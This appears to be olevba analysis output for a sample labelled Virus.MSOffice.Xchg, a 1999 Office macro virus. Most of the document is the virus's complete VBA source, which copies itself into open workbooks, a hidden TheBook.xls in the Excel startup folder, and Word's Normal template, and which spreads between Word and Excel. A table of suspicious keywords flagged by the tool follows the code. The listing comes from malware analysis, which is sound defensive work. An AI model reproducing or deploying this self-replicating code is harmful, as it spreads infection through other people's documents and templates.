olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Xchg-635d9f57b9b6c593de9ce7abe9135ce1c935253f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Xchg-635d9f57b9b6c593de9ce7abe9135ce1c935253f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xchg.bas 
in file: Virus.MSOffice.Xchg-635d9f57b9b6c593de9ce7abe9135ce1c935253f - OLE stream: 'Macros/VBA/xchg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem Name:   Office97Macro.Xchange
Rem Author: jack twoflower LineZer0/Metaphase
Rem Date:   May 1999



Sub InfExcel()
Set Host = CheckForRefExcel
VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)

Set Active_ = ActiveWorkbook.VBProject.VBComponents

For i = 1 To Active_.Count
    If Active_(i).Name = "xchg" Then AlreadyInf = True
Next

If AlreadyInf <> True Then
    Active_.Add (vbext_ct_StdModule)
    Active_(Active_.Count).Name = "xchg"
    Active_("xchg").CodeModule.AddFromString VirusCode
    ActiveWorkbook.SaveAs ActiveWorkbook.FullName
End If

If UCase(Dir(Application.StartupPath & "\TheBook.xls")) <> "THEBOOK.XLS" Then
    Workbooks.Add.SaveAs Application.StartupPath & "\TheBook.xls"
    Workbooks("TheBook.xls").VBProject.VBComponents.Add (vbext_ct_StdModule)
    Workbooks("TheBook.xls").VBProject.VBComponents(Workbooks("TheBook.xls").VBProject.VBComponents.Count).Name = "xchg"
    Workbooks("TheBook.xls").VBProject.VBComponents("xchg").CodeModule.AddFromString VirusCode
    Windows("TheBook.xls").Visible = False
    Workbooks("TheBook.xls").Save
End If

End Sub

Sub InfExcelCross()

Set Host = CheckForRefWord
VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)

Set xl = CreateObject("excel.application")
Set work = xl.Workbooks.Add

work.VBProject.VBComponents.Add (vbext_ct_StdModule)
work.VBProject.VBComponents("Modul1").CodeModule.AddFromString VirusCode

work.SaveAs xl.StartupPath & "\TheBook.xls"

xl.Quit

End Sub

Sub InfWord()

Set Host = CheckForRefWord
VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)

Set Normal_ = NormalTemplate.VBProject.VBComponents
Set Active_ = ActiveDocument.VBProject.VBComponents

For i = 1 To Normal_.Count
    If Normal_(i).Name = "xchg" Then NorIns = True
Next i
For j = 1 To Active_.Count
    If Active_(j).Name = "xchg" Then ActIns = True
    MsgBox Active_(j).Name
Next j

If NorIns <> True Then
    Normal_.Add (vbext_ct_StdModule)
    Normal_(Normal_.Count).Name = "xchg"
    Normal_("xchg").CodeModule.AddFromString VirusCode
    NormalTemplate.Save
End If

If ActIns <> True Then
    Active_.Add (vbext_ct_StdModule)
    Active_(Active_.Count).Name = "xchg"
    Active_("xchg").CodeModule.AddFromString VirusCode
    ActiveDocument.SaveAs ActiveDocument.FullName
End If
End Sub

Sub InfWordCross()

Set Host = CheckForRefExcel
VirusLength = Host.VBComponents("xchg").CodeModule.CountOfLines
VirusCode = Host.VBComponents("xchg").CodeModule.Lines(1, VirusLength)

Set wd = CreateObject("word.application")

wd.NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
wd.NormalTemplate.VBProject.VBComponents("Modul1").CodeModule.AddFromString VirusCode

wd.NormalTemplate.Save

wd.Quit

End Sub

Function CheckForRefExcel()

Set CheckForRefExcel = ActiveWorkbook.VBProject

For i = 1 To CheckForRefExcel.References.Count
    If CheckForRefExcel.References(i).Name = "VBIDE" Then AlreadyRef = True
Next

If AlreadyRef = False Then CheckForRefExcel.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End Function

Function CheckForRefWord()

If MacroContainer = NormalTemplate Then Set CheckForRefWord = NormalTemplate.VBProject
If MacroContainer = ActiveDocument Then Set CheckForRefWord = ActiveDocument.VBProject

For i = 1 To CheckForRefWord.References.Count
    If CheckForRefWord.References(i).Name = "VBIDE" Then AlreadyRef = True
Next

If AlreadyRef = False Then CheckForRefWord.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End Function

Rem Dead Kennedys roqs!!!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

